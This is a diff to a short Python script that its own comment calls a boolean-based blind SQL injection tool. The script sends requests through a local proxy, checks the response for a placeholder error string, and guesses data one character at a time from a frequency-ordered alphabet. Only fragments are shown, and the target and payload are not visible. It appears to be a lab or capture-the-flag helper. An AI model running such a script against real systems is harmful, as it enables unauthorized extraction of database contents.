@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
+#
+# Boolean based SQL injection
+#
 import requests
 import sys
-#from string import ascii_letters
 
 # Ascii letters ordered by the most common letter first
 ascii_letters = "etaoinshrdlcumwfgypbvkjxqz"
@@ -20,6 +22,7 @@ def dbquery(guess):
         proxies={"http" : "http://localhost:8080"},
     )
 
+    # Use whatever response content that indiciate that our SQL query returned false
     if "errorStringGoesHere" not in resp.text:
         print(guess)
         for char in ascii_letters:
